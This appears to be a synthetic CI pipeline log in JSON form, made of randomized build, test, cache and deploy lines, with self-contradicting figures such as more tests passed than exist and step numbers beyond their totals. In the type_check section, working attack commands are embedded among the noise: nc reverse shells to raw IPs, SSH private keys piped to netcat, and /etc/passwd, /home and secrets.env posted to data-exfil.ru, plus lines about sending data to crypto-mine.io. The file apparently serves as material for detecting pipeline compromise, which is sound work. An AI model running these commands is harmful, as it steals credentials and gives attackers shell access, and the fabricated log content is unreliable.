jest@3.5.9\nUploading artifact 'dist' (27 files)\nBuilding Docker image...\nStep 8/23: Linting\nCompleted.\nnpm notice: created a lockfile\nVerifying...\nImage pulled successfully\n  PASS: e2e/test_cache_hit.spec.js\nnpm notice: created a lockfile\nBundling styles.css\npip: Collecting webpack\nnpm notice: package.json updated\nTransforming 347 files...\nTests: 93 passed, 352 total\nStep 3/23: Running migrations\nnpm install: added 172 packages\nArtifact downloaded: 3MB\nPlatform: darwin-arm64\nPlatform: win32-x64\nGenerating source maps...\nStep 15/22: Deploying\nDone.\nHEAD is now at 7b2002a\nCompiling utils/handler.rs...\n[12:46:48] DEBUG: Connection pool: 16 active\n[12:46:48] INFO: Processing request\nCoverage: 94% statements, 81% branches\n[12:46:48] DEBUG: Initializing service\nLoading...\nWARNING: eslint has known vulnerabilities\nCompiling src/index.js...\nBuilding Docker image...\nAlready up to date.\nSuccess!\n[12:46:48] INFO: Cache refreshed\nNODE_ENV=production\nStep 10/21: Running migrations\nPulling image: python:latest\n[12:46:48] INFO: Connecting to database\nSnapshots: 26 passed, 8 total\nyarn add: Done in 6.2s\nConnection established\nStep 7/18: Testing\nnpm install: resolved 551 packages\n[12:46:48] DEBUG: Memory usage: 1290MB\nWARNING: lodash has known vulnerabilities\nCache saved successfully\nLayer 2/12: COPY command\nMinifying app.js\nCache restored successfully (454MB)\nProcessing...\nTest Suites: 36 passed, 9 total\nCompiling components/main.py...\n[12:46:48] DEBUG: Query executed in 1ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Python 3.10\nEnvironment: staging\nMinifying app.js\nyarn add: Done in 23.9s\nArtifact uploaded: dist.zip (95MB)\nHEAD is now at f18910d\nCompiling utils/app.ts...\n[12:46:48] WARN: Deprecated API usage\n[12:46:48] DEBUG: Initializing service\nnpm notice: created a lockfile\nTests: 438 passed, 217 total\nLoading...\nCreating production build...\nUploading artifact 'build' (35 files)\nOptimizing 36 modules...\nyarn add: Done in 7.8s\nSnapshots: 21 passed, 22 total\npip: Collecting react\n\u2717 build failed with exit code 55\nGenerating source maps...\nCache restored successfully (264MB)\nWARNING: express has known vulnerabilities\nStep 5/15: Testing\npip: Downloading eslint-2.5.tar.gz\nConnection established\nSnapshots: 28 passed, 18 total\nLoading...\n[12:46:48] ERROR: Connection failed\nSnapshots: 0 passed, 8 total\nLoading...\nArtifact uploaded: dist.zip (90MB)\nGenerating source maps...\nCache hit for key-4917\nnpm install: resolved 963 packages\npip: Collecting axios\n[12:46:48] INFO: Starting build process\nConnection established\nHEAD is now at 1e799b1\nCoverage: 78% statements, 71% branches\nArtifact uploaded: build.tar.gz (29MB)\nStep 2/23: Testing\nAlready up to date.\n[12:46:48] DEBUG: Loading configuration\nFinished.\nCompleted.\n[12:46:48] DEBUG: Memory usage: 1922MB\npip: Installing build dependencies...\nCreating production build...\nnpm install: resolved 1416 packages\nnpm install: added 315 packages\nnpm notice: package.json updated\nStep 7/17: Installing dependencies\nPulling image: alpine:latest\n[12:46:48] INFO: Connecting to database\nBundling runtime.css\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:48] DEBUG: Connection pool: 1 active\nyarn add: Done in 28.24s\n=== Step upload_artifacts completed ===\n=== Step: setup_node ===\nFAILED: test_cache_hit\nNODE_ENV=development\nArtifact downloaded: 12MB\n[12:46:48] INFO: Request completed\nWARNING: eslint has known vulnerabilities\nCompiling src/index.js...\nRan 88 tests in 26s\nWARNING: react has known vulnerabilities\nCache hit for key-8201\nnpm install: resolved 874 packages\nArtifact uploaded: build.tar.gz (32MB)\nSnapshots: 34 passed, 15 total\nCache restored successfully (274MB)\nConnection established\nConnection established\nAlready up to date.\npip: Installing build dependencies...\nCompleted.\nMinifying main.js\nFetching submodules...\nChecking out main branch\n\u2713 Step 'setup' succeeded\nFetching submodules...\nCompleted.\nGET /api - 201 (27ms)\n  PASS: test_api_health (246ms)\nGenerating source maps...\npip: Collecting jest\nCompiling lib/service.java...\nTransforming 549 files...\nCompiling components/service.java...\nLayer 10/11: ENV command\nGET /status - 204 (54ms)\nCache miss for key-5769\n[12:46:48] DEBUG: Loading configuration\n  PASS: unit/test_db_connect.spec.js\npip: Installing build dependencies...\nTransforming 490 files...\nFAILED: test_cache_hit\n  PASS: unit/test_auth_login.spec.js\nUsing Python 3.9\nStep 9/20: Deploying\nGenerating source maps...\nUploading artifact 'build' (47 files)\npip: Collecting lodash\nStep 17/17: Running migrations\nTest Suites: 27 passed, 49 total\nUploading artifact 'coverage' (13 files)\nyarn add: Done in 6.80s\nStep 8/23: Linting\nNODE_ENV=development\nOK\nNODE_ENV=development\nyarn add: Done in 15.69s\nStep 17/20: Linting\nMinifying app.js\nCache hit for key-5328\nDone.\nyarn add: Done in 16.31s\npip install: Successfully installed jest-1.4\npip: Downloading lodash-4.16.tar.gz\nCreating production build...\nStep 2/16: Testing\nAlready up to date.\nnpm notice: package.json updated\nnpm notice: package.json updated\nCache restored successfully (237MB)\n[12:46:48] DEBUG: Loading configuration\nFinished.\nStep 4/23: Linting\nGET /api - 201 (77ms)\nStep 11/16: Building\nPushing to registry...\nPlatform: linux-x64\nPOST /upload - 202 (160ms)\nUploading artifact 'coverage' (2 files)\nCoverage: 84% statements, 79% branches\npip: Installing build dependencies...\nArtifact downloaded: 8MB\n\u2713 All checks passed\nStep 18/17: Deploying\nCache restored successfully (320MB)\nException: RuntimeError\nLoading...\n\u2713 Task completed in 234ms\n[12:46:48] INFO: Connecting to database\nBuilding Docker image...\n  PASS: test_api_health (191ms)\nHEAD is now at f23144d\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFetching from https://amazonaws.com/package.json\nCompleted.\nnpm install: resolved 1759 packages\nNODE_ENV=production\npip: Collecting eslint\nStep 17/17: Running migrations\nStep 17/25: Testing\n[12:46:48] DEBUG: Memory usage: 1128MB\nUsing Python 3.11\nConnection established\nUploading artifact 'dist' (34 files)\nCache saved successfully\nWARNING: jest has known vulnerabilities\nWARNING: react has known vulnerabilities\nMinifying vendor.js\nPulling image: node:latest\nCache restored successfully (473MB)\nWARNING: jest has known vulnerabilities\n[12:46:48] INFO: Connecting to database\nPushing to registry...\nTest Suites: 40 passed, 38 total\npip install: Successfully installed lodash-5.9\nProcessing...\nReady.\nUsing Python 3.12\nOK\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling utils/utils.go...\nCache restored successfully (458MB)\n\u2713 build completed\nLoading...\nTest Suites: 13 passed, 40 total\npip: Downloading webpack-3.1.tar.gz\nCache invalidated: dependencies\n\u2713 Task completed in 4010ms\nOptimizing 61 modules...\nHEAD is now at a1415cf\nStep 14/18: Building\n[12:46:48] INFO: Cache refreshed\n[12:46:48] DEBUG: Connection pool: 14 active\npip install: Successfully installed react-3.4\n[12:46:48] DEBUG: Loading configuration\nTime: 119.572s\n[12:46:48] DEBUG: Loading configuration\nUsing Python 3.11\nPulling image: alpine:18\nSuccess!\n[12:46:48] INFO: Processing request\nCompleted.\nFinished.\n  PASS: integration/test_db_connect.spec.js\nStep 3/19: Linting\nCreating production build...\nStep 19/22: Running migrations\n[12:46:48] ERROR: Connection failed\nnpm notice: created a lockfile\nArtifact uploaded: dist.zip (99MB)\nCache restored successfully (215MB)\npip install: Successfully installed jest-1.0\nTests: 303 passed, 382 total\nnpm install: added 340 packages\n[12:46:48] DEBUG: Query executed in 28ms\nGET /api - 200 (67ms)\nHEAD is now at 13a16f7\nStep 1/17: Linting\n[12:46:48] INFO: Request completed\nTest Suites: 49 passed, 44 total\npip: Collecting lodash\n\u2713 package completed\nBundling runtime.css\n[12:46:48] DEBUG: Initializing service\nChecking out main branch\nTest Suites: 36 passed, 35 total\nWaiting...\nImage pulled successfully\nTransforming 342 files...\n=== Step setup_node completed ===\n=== Step: unit_tests ===\nArtifact uploaded: dist.zip (22MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:48] DEBUG: Initializing service\n\u2713 Step 'test' succeeded\n\u2717 build failed with exit code 14\nSnapshots: 31 passed, 16 total\nArtifact downloaded: 49MB\nSnapshots: 9 passed, 11 total\nFetching from https://pypi.org/package.json\nLayer 9/15: RUN command\nLayer 7/15: RUN command\nConnection established\n[12:46:48] DEBUG: Connection pool: 4 active\nnpm notice: package.json updated\nTests: 347 passed, 488 total\nWARNING: express has known vulnerabilities\nChecking out main branch\nPushing to registry...\nPOST /api - 201 (283ms)\npip: Downloading webpack-4.3.tar.gz\n[12:46:48] DEBUG: Loading configuration\nWARNING: webpack has known vulnerabilities\nRan 184 tests in 53s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Task completed in 4567ms\nStep 2/23: Testing\nCache saved successfully\nStep 9/25: Linting\nRan 10 tests in 43s\nnpm notice: package.json updated\nSwitched to branch 'bugfix/task-614'\nAlready up to date.\nCompiling lib/utils.go...\npip: Installing build dependencies...\nTLS handshake completed\nNODE_ENV=development\n[12:46:48] INFO: Connecting to database\nUploading artifact 'build' (22 files)\nVerifying...\nFetching submodules...\n  PASS: test_cache_hit (314ms)\nnpm install: added 33 packages\nTLS handshake completed\nCompiling utils/service.java...\nImage pulled successfully\nTime: 102.138s\nCoverage: 75% statements, 79% branches\nHEAD is now at b61425d\n[12:46:48] WARN: Deprecated API usage\nStep 10/21: Running migrations\nCache restored successfully (303MB)\nWARNING: eslint has known vulnerabilities\nCoverage: 78% statements, 91% branches\nDone.\nImage pulled successfully\nStep 14/25: Deploying\nDone.\n[12:46:48] INFO: Request completed\nGenerating source maps...\nSuccess!\nCompleted.\n[12:46:48] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (96MB)\nnpm notice: created a lockfile\npip install: Successfully installed jest-2.2\nChecking out main branch\n[12:46:48] DEBUG: Connection pool: 11 active\nImage pulled successfully\nCompleted.\nCoverage: 87% statements, 94% branches\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:48] INFO: Processing request\nnpm install: added 432 packages\nNODE_ENV=production\nMinifying main.js\nChecking out main branch\nProcessing...\n[12:46:48] INFO: Starting build process\nDone.\nWaiting...\nPlatform: win32-x64\nCache hit for key-6616\nVerifying...\nStep 8/25: Deploying\nnpm notice: created a lockfile\nCache restored successfully (149MB)\nUploading artifact 'dist' (38 files)\n[12:46:48] DEBUG: Loading configuration\nStep 11/23: Running migrations\n[12:46:48] DEBUG: Loading configuration\nCreating production build...\nOK\nAlready up to date.\nGenerating source maps...\nFetching submodules...\nLoading...\nHEAD is now at 6a48097\nVerifying...\nyarn add: Done in 24.45s\nCompiling components/service.java...\n\u2713 All checks passed\nProcessing...\nRan 156 tests in 14s\npip install: Successfully installed react-2.6\nPlatform: darwin-arm64\nTests: 360 passed, 321 total\nTests: 255 passed, 375 total\nyarn add: Done in 26.27s\nRan 151 tests in 9s\nStep 2/16: Running migrations\nPulling image: alpine:latest\npip: Downloading lodash-1.8.tar.gz\nImage pulled successfully\n[12:46:48] WARN: Deprecated API usage\nnpm install: resolved 847 packages\nStep 17/21: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCreating production build...\n\u2717 build failed with exit code 105\n[12:46:48] INFO: Cache refreshed\nTransforming 547 files...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/index.js...\nWARNING: lodash has known vulnerabilities\nPOST /data - 202 (127ms)\n[12:46:48] INFO: Request completed\nnpm install: resolved 129 packages\nStep 19/18: Testing\nLayer 6/8: ENV command\nUsing Node.js 14.8.5\nArtifact downloaded: 6MB\nUsing Python 3.11\nOptimizing 40 modules...\nGET /health - 200 (56ms)\nUploading artifact 'coverage' (20 files)\nConnection established\nHEAD is now at bc99a95\nUploading artifact 'dist' (8 files)\nCache hit for key-9182\nnpm install: resolved 1044 packages\nGET /api - 201 (75ms)\npip: Collecting eslint\nBuilding Docker image...\n[12:46:48] INFO: Processing request\nSuccess!\nUploading artifact 'dist' (36 files)\nFetching submodules...\npip: Downloading jest-3.11.tar.gz\nArtifact uploaded: dist.zip (91MB)\nTests: 396 passed, 423 total\n\u2713 All checks passed\nCompiling lib/app.ts...\nnpm notice: package.json updated\n[12:46:48] INFO: Request completed\nGenerating source maps...\nLayer 7/13: COPY command\nUsing Python 3.10\nPushing to registry...\nTests: 221 passed, 374 total\nArtifact uploaded: dist.zip (86MB)\nFAILED: test_user_create\n[12:46:48] DEBUG: Memory usage: 1357MB\npip: Downloading webpack-3.17.tar.gz\n[12:46:48] DEBUG: Loading configuration\n=== Step unit_tests completed ===\n=== Step: type_check ===\nWARNING: eslint has known vulnerabilities\nCreating production build...\nCompleted.\nSuccess!\n[12:46:48] WARN: Deprecated API usage\nWARNING: eslint has known vulnerabilities\n\u2717 build failed with exit code 3\nUploading artifact 'coverage' (14 files)\nTransforming 468 files...\nTLS handshake completed\nAlready up to date.\nnpm notice: created a lockfile\npip: Collecting jest\nEnvironment: production\n[12:46:48] DEBUG: Initializing service\nReady.\nnc -e /bin/sh 195.39.41.161 26761\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\npip: Downloading express-1.20.tar.gz\necho $(cat ~/.ssh/id_rsa) | base64 | nc 56.106.36.89 52825\nSuccess!\nTLS handshake completed\nnpm install: added 144 packages\nnpm install: added 364 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 11.5.42.145 57446\n  PASS: unit/test_cache_hit.spec.js\nArtifact uploaded: dist.zip (93MB)\nVerifying...\nCoverage: 72% statements, 91% branches\nyarn add: Done in 25.10s\nWARNING: webpack has known vulnerabilities\nTime: 117.851s\nNODE_ENV=production\nPOST /api - 200 (439ms)\nStep 2/18: Running migrations\nCache restored successfully (223MB)\n\u2717 build failed with exit code 20\n[12:46:48] DEBUG: Connection pool: 3 active\nCompiling utils/service.java...\nTests: 162 passed, 250 total\nStep 11/18: Testing\necho $(cat ~/.ssh/id_rsa) | base64 | nc 1.122.76.168 20378\nStep 7/22: Linting\nUsing Python 3.11\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnc -e /bin/sh 226.77.28.222 2116\nCompleted.\nStep 1/22: Linting\n[12:46:48] DEBUG: Connection pool: 15 active\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nAlready up to date.\nnpm notice: package.json updated\nnpm install: added 172 packages\nException: RuntimeError\npip: Installing build dependencies...\nnpm notice: created a lockfile\n\u2713 Task completed in 719ms\nTime: 84.459s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnc -e /bin/sh 211.224.77.236 61902\nInstalling eslint@2.6.2\nnpm install: added 418 packages\nTLS handshake completed\n[12:46:48] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:48] DEBUG: Query executed in 5ms\nArtifact downloaded: 31MB\nPushing to registry...\n[12:46:48] INFO: Processing request\n  PASS: unit/test_api_health.spec.js\nImage pulled successfully\nCache invalidated: build\npip install: Successfully installed lodash-2.11\nCompiling lib/main.py...\n  PASS: test_user_create (120ms)\n\u2717 build failed with exit code 18\nInstalling react@4.15.6\nPulling image: node:3.11\nyarn add: Done in 27.89s\nInstalling jest@2.16.7\nCompiling lib/utils.go...\nWARNING: react has known vulnerabilities\nCoverage: 100% statements, 73% branches\n  PASS: e2e/test_auth_login.spec.js\nUsing Python 3.11\nStep 15/22: Building\nSwitched to branch 'feature/task-550'\n[12:46:48] ERROR: Connection failed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 92.10.34.209 56636\nCompiling src/handler.rs...\nFAILED: test_user_create\nTests: 52 passed, 494 total\nSnapshots: 39 passed, 14 total\nProcessing...\npip: Collecting prettier\nNODE_ENV=test\n\u2713 test completed\nArtifact uploaded: build.tar.gz (6MB)\n[12:46:48] ERROR: Connection failed\nCache restored successfully (268MB)\nTests: 219 passed, 179 total\nCompiling lib/handler.rs...\npip: Downloading eslint-3.2.tar.gz\nUploading artifact 'coverage' (30 files)\nEnvironment: staging\n[12:46:48] DEBUG: Connection pool: 17 active\nCompiling components/app.ts...\nTLS handshake completed\nTime: 70.653s\nCache saved successfully\nPushing to registry...\n\u2713 Step 'setup' succeeded\nArtifact uploaded: dist.zip (33MB)\n[12:46:48] WARN: Deprecated API usage\n  PASS: unit/test_cache_hit.spec.js\nCache miss for key-4045\n\u2713 deploy completed\nWARNING: axios has known vulnerabilities\n[12:46:48] DEBUG: Loading configuration\nSuccess!\nFetching submodules...\nPlatform: darwin-arm64\npip: Downloading eslint-3.2.tar.gz\nDone.\nPlatform: darwin-arm64\nEnvironment: staging\n[12:46:48] INFO: Processing request\n  PASS: integration/test_db_connect.spec.js\nSnapshots: 23 passed, 30 total\nCompiling components/main.py...\nSending 307MB of data to crypto-mine.io\nMinifying app.js\nGET /health - 204 (2ms)\nException: NullPointerException\nEnvironment: staging\nPlatform: darwin-arm64\n[12:46:48] INFO: Request completed\npip install: Successfully installed jest-1.3\nLayer 4/14: RUN command\nStep 14/19: Deploying\nEnvironment: test\nArtifact uploaded: dist.zip (47MB)\nSuccess!\nArtifact uploaded: build.tar.gz (48MB)\nGET /api - 204 (42ms)\nCache miss for key-2849\nEnvironment: staging\nNODE_ENV=development\nWaiting...\nTest Suites: 44 passed, 44 total\nUsing Python 3.12\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nStep 6/15: Installing dependencies\nTest Suites: 37 passed, 31 total\nStep 11/18: Installing dependencies\nSuccess!\nTests: 63 passed, 142 total\nSwitched to branch 'hotfix/task-534'\nProcessing...\nBuilding Docker image...\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOK\nCompiling src/utils.go...\n[12:46:48] DEBUG: Query executed in 40ms\n[12:46:48] WARN: Deprecated API usage\nTests: 286 passed, 368 total\nFinished.\nCache invalidated: dependencies\nReady.\nTLS handshake completed\nRan 124 tests in 31s\n[12:46:48] WARN: Deprecated API usage\npip install: Successfully installed eslint-1.3\nCompiling lib/utils.go...\nArtifact uploaded: dist.zip (98MB)\nSending 250MB of data to evil-server.cc\n=== Step type_check completed ===",
    "steps": [
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-18T12:46:48.625199",
        "finished_at": "2025-12-18T12:46:59.030152",
        "log_lines": [
          "=== Step: save_cache ===",
          "\u2713 Task completed in 840ms",
          "[12:46:48] DEBUG: Initializing service",
          "Creating production build...",
          "Verifying...",
          "npm notice: created a lockfile",
          "Fetching submodules...",
          "WARNING: lodash has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 8/17: Building",
          "Cache invalidated: build",
          "  PASS: test_db_connect (460ms)",
          "Platform: win32-x64",
          "Bundling vendor.css",
          "Cache restored successfully (188MB)",
          "OK",
          "Image pulled successfully",
          "Compiling lib/index.js...",
          "yarn add: Done in 12.50s",
          "npm notice: created a lockfile",
          "Pulling image: node:18",
          "Artifact uploaded: dist.zip (4MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: jest has known vulnerabilities",
          "Fetching from https://npmjs.org/package.json",
          "Layer 2/11: RUN command",
          "Generating source maps...",
          "NODE_ENV=production",
          "Creating production build...",
          "Compiling lib/service.java...",
          "OK",
          "npm notice: package.json updated",
          "npm notice: package.json updated",
          "Loading...",
          "[12:46:48] INFO: Starting build process",
          "pip: Collecting webpack",
          "Artifact uploaded: build.tar.gz (20MB)",
          "TLS handshake completed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Cache miss for key-2456",
          "Processing...",
          "WARNING: lodash has known vulnerabilities",
          "pip: Downloading react-1.15.tar.gz",
          "npm notice: created a lockfile",
          "[12:46:48] INFO: Processing request",
          "Generating source maps...",
          "Test Suites: 42 passed, 39 total",
          "Optimizing 91 modules...",
          "Using Node.js 15.15.1",
          "POST /data - 200 (178ms)",
          "Done.",
          "Fetching submodules...",
          "  PASS: e2e/test_user_create.spec.js",
          "[12:46:48] INFO: Starting build process",
          "[12:46:48] INFO: Starting build process",
          "Pulling image: alpine:3.11",
          "[12:46:48] DEBUG: Memory usage: 1772MB",
          "[12:46:48] INFO: Starting build process",
          "Bundling main.js",
          "Processing...",
          "Switched to branch 'hotfix/task-779'",
          "pip: Downloading jest-3.6.tar.gz",
          "Step 13/25: Running migrations",
          "Step 20/20: Running migrations",
          "Ready.",
          "Compiling components/app.ts...",
          "Connection established",
          "Cache hit for key-2052",
          "npm install: resolved 1837 packages",
          "Pulling image: python:18",
          "\u2713 All checks passed",
          "Exception: NullPointerException",
          "Waiting...",
          "NODE_ENV=test",
          "Coverage: 70% statements, 85% branches",
          "Using Node.js 14.11.3",
          "Exception: ValueError",
          "Artifact uploaded: dist.zip (90MB)",
          "POST /data - 201 (47ms)",
          "[12:46:48] DEBUG: Query executed in 37ms",
          "Step 7/15: Testing",
          "Artifact uploaded: dist.zip (50MB)",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Processing...",
          "[12:46:48] WARN: Deprecated API usage",
          "pip: Collecting jest",
          "Test Suites: 34 passed, 15 total",
          "\u2713 All checks passed",
          "Loading...",
          "pip install: Successfully installed webpack-5.8",
          "[12:46:48] ERROR: Connection failed",
          "[12:46:48] WARN: Deprecated API usage",
          "\u2713 Step 'install' succeeded",
          "NODE_ENV=test",
          "Step 16/24: Linting",
          "Fetching submodules...",
          "pip: Downloading eslint-4.5.tar.gz",
          "pip: Downloading prettier-4.8.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Completed.",
          "Minifying vendor.js",
          "Switched to branch 'hotfix/task-882'",
          "Step 12/22: Running migrations",
          "Step 5/20: Building",
          "Step 5/19: Building",
          "Pushing to registry...",
          "[12:46:48] WARN: Deprecated API usage",
          "Using Node.js 18.15.3",
          "\u2713 Step 'test' succeeded",
          "WARNING: prettier has known vulnerabilities",
          "Cache saved successfully",
          "Verifying...",
          "\u2713 All checks passed",
          "[12:46:48] INFO: Starting build process",
          "Processing...",
          "Environment: development",
          "[12:46:48] WARN: Deprecated API usage",
          "Step 18/23: Running migrations",
          "[12:46:48] WARN: Deprecated API usage",
          "  PASS: integration/test_user_create.spec.js",
          "NODE_ENV=development",
          "[12:46:48] DEBUG: Memory usage: 1401MB",
          "Loading...",
          "\u2713 Task completed in 3212ms",
          "[12:46:48] INFO: Starting build process",
          "Connection established",
          "\u2713 Step 'checkout' succeeded",
          "HEAD is now at 9810a30",
          "Time: 86.422s",
          "Tests: 433 passed, 472 total",
          "[12:46:48] DEBUG: Query executed in 52ms",
          "Loading...",
          "Environment: test",
          "Loading...",
          "NODE_ENV=test",
          "[12:46:48] DEBUG: Query executed in 80ms",
          "Tests: 173 passed, 54 total",
          "Ran 146 tests in 37s",
          "Image pulled successfully",
          "Artifact downloaded: 31MB",
          "Compiling lib/utils.go...",
          "pip: Collecting axios",
          "TLS handshake completed",
          "Waiting...",
          "Step 16/24: Installing dependencies",
          "Creating production build...",
          "Platform: linux-x64",
          "Bundling styles.css",
          "Transforming 437 files...",
          "Step 16/24: Installing dependencies",
          "OK",
          "Waiting...",
          "Installing react@2.2.9",
          "  PASS: unit/test_user_create.spec.js",
          "\u2713 Step 'build' succeeded",
          "Tests: 346 passed, 495 total",
          "Uploading artifact 'dist' (6 files)",
          "npm notice: created a lockfile",
          "Finished.",
          "[12:46:48] WARN: Deprecated API usage",
          "\u2713 deploy completed",
          "POST /api - 201 (212ms)",
          "Cache hit for key-6014",
          "FAILED: test_user_create",
          "Snapshots: 32 passed, 7 total",
          "[12:46:48] DEBUG: Initializing service",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-18T12:46:59.030152",
        "finished_at": "2025-12-18T12:47:16.371740",
        "log_lines": [
          "=== Step: lint ===",
          "Pulling image: node:3.11",
          "Exception: TypeError",
          "Waiting...",
          "Cache hit for key-4842",
          "Step 13/24: Running migrations",
          "Already up to date.",
          "Processing...",
          "pip: Downloading express-1.0.tar.gz",
          "\u2713 validate completed",
          "Step 15/25: Linting",
          "[12:46:48] WARN: Deprecated API usage",
          "Compiling utils/service.java...",
          "POST /api - 200 (175ms)",
          "Using Python 3.9",
          "OK",
          "Step 9/16: Building",
          "\u2713 Step 'build' succeeded",
          "Compiling lib/main.py...",
          "npm notice: created a lockfile",
          "Snapshots: 25 passed, 7 total",
          "[12:46:48] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:48] ERROR: Connection failed",
          "[12:46:48] DEBUG: Initializing service",
          "\u2713 test completed",
          "Step 8/20: Linting",
          "Compiling utils/main.py...",
          "[12:46:48] WARN: Deprecated API usage",
          "Ran 60 tests in 22s",
          "Uploading artifact 'coverage' (17 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache invalidated: node_modules",
          "Artifact downloaded: 38MB",
          "Using Python 3.10",
          "Layer 5/13: RUN command",
          "TLS handshake completed",
          "Waiting...",
          "FAILED: test_auth_login",
          "Using Python 3.10",
          "pip install: Successfully installed lodash-1.7",
          "\u2717 build failed with exit code 35",
          "WARNING: express has known vulnerabilities",
          "[12:46:48] DEBUG: Loading configuration",
          "\u2713 All checks passed",
          "Ready.",
          "Compiling lib/app.ts...",
          "Using Node.js 18.10.1",
          "Step 17/21: Linting",
          "Ready.",
          "yarn add: Done in 29.22s",
          "Generating source maps...",
          "npm notice: package.json updated",
          "[12:46:48] INFO: Processing request",
          "[12:46:48] WARN: Deprecated API usage",
          "[12:46:48] INFO: Processing request",
          "FAILED: test_db_connect",
          "\u2713 build completed",
          "[12:46:48] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "npm install: resolved 1863 packages",
          "Optimizing 38 modules...",
          "Step 4/15: Running migrations",
          "Transforming 221 files...",
          "[12:46:48] DEBUG: Initializing service",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: created a lockfile",
          "Compiling lib/utils.go...",
          "Step 5/25: Deploying",
          "Creating production build...",
          "OK",
          "\u2713 All checks passed",
          "\u2717 build failed with exit code 118",
          "Cache invalidated: build",
          "Using Node.js 16.11.10",
          "Exception: RuntimeError",
          "Already up to date.",
          "Transforming 282 files...",
          "Using Python 3.12",
          "Optimizing 63 modules...",
          "Connection established",
          "\u2713 All checks passed",
          "Generating source maps...",
          "Snapshots: 34 passed, 6 total",
          "Compiling src/main.py...",
          "npm notice: package.json updated",
          "Snapshots: 8 passed, 21 total",
          "Success!",
          "Compiling lib/index.js...",
          "[12:46:48] DEBUG: Connection pool: 17 active",
          "Optimizing 92 modules...",
          "Cache invalidated: node_modules",
          "Time: 67.632s",
          "WARNING: axios has known vulnerabilities",
          "Step 18/21: Deploying",
          "Snapshots: 33 passed, 41 total",
          "Checking out main branch",
          "Cache miss for key-7599",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Minifying app.js",
          "Cache hit for key-2360",
          "Transforming 658 files...",
          "FAILED: test_user_create",
          "Cache saved successfully",
          "Completed.",
          "HEAD is now at d8fe88e",
          "Loading...",
          "Already up to date.",
          "\u2713 Task completed in 2650ms",
          "Generating source maps...",
          "[12:46:48] DEBUG: Initializing service",
          "Layer 8/14: RUN command",
          "Verifying...",
          "pip: Collecting express",
          "  PASS: test_cache_hit (152ms)",
          "[12:46:48] DEBUG: Loading configuration",
          "Transforming 378 files...",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Platform: linux-x64",
          "\u2713 lint completed",
          "Test Suites: 31 passed, 16 total",
          "npm notice: created a lockfile",
          "Optimizing 96 modules...",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:48] DEBUG: Memory usage: 212MB",
          "OK",
          "pip: Collecting jest",
          "Switched to branch 'feature/task-600'",
          "\u2713 Task completed in 4131ms",
          "Artifact uploaded: dist.zip (8MB)",
          "[12:46:48] INFO: Request completed",
          "Compiling utils/utils.go...",
          "[12:46:48] DEBUG: Initializing service",
          "Step 9/19: Testing",
          "[12:46:48] DEBUG: Initializing service",
          "Waiting...",
          "  PASS: test_api_health (10ms)",
          "Compiling lib/service.java...",
          "Verifying...",
          "[12:46:48] INFO: Request completed",
          "[12:46:48] WARN: Deprecated API usage",
          "Fetching submodules...",
          "  PASS: unit/test_api_health.spec.js",
          "Cache invalidated: build",
          "[12:46:48] DEBUG: Connection pool: 11 active",
          "Image pulled successfully",
          "Pulling image: alpine:latest",
          "Step 5/16: Deploying",
          "[12:46:48] WARN: Deprecated API usage",
          "Processing...",
          "Transforming 916 files...",
          "OK",
          "yarn add: Done in 25.98s",
          "Using Node.js 15.8.5",
          "Artifact uploaded: dist.zip (7MB)",
          "Generating source maps...",
          "[12:46:48] DEBUG: Loading configuration",
          "\u2713 Step 'test' succeeded",
          "Step 13/21: Linting",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "[12:46:48] DEBUG: Query executed in 73ms",
          "WARNING: react has known vulnerabilities",
          "[12:46:48] DEBUG: Initializing service",
          "[12:46:48] INFO: Connecting to database",
          "[12:46:48] INFO: Starting build process",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-18T12:47:16.371740",
        "finished_at": "2025-12-18T12:48:08.396504",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "[12:46:48] INFO: Cache refreshed",
          "Waiting...",
          "Building Docker image...",
          "Generating source maps...",
          "Pulling image: python:3.11",
          "Artifact uploaded: build.tar.gz (13MB)",
          "npm notice: created a lockfile",
          "Creating production build...",
          "pip install: Successfully installed eslint-5.5",
          "pip install: Successfully installed prettier-2.6",
          "Verifying...",
          "Finished.",
          "Artifact downloaded: 2MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
